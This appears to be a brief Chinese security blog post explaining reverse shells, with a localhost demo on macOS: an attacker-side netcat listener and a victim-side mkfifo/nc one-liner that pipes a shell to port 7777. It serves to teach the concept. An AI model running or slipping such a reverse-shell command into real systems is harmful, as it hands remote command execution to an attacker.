---
layout: post
title: 反弹shell
categories: [安全]
---
反弹shell（reverse shell)

## mac下单机模拟反弹shell

- 攻击机
  通过netcat建立反弹shell,待受害机建立链接后，通过bash shell远程执行命令
```
nc -lv 7777
```

- 受害机
  ```
  mkfifo myfifo
  nc 127.0.0.1 7777 < myfifo | /bin/bash  -i > myfifo  2>&1
  ```


## 参考
[mac reverse shell](https://apple.stackexchange.com/questions/324824/create-reverse-shell-using-high-sierra)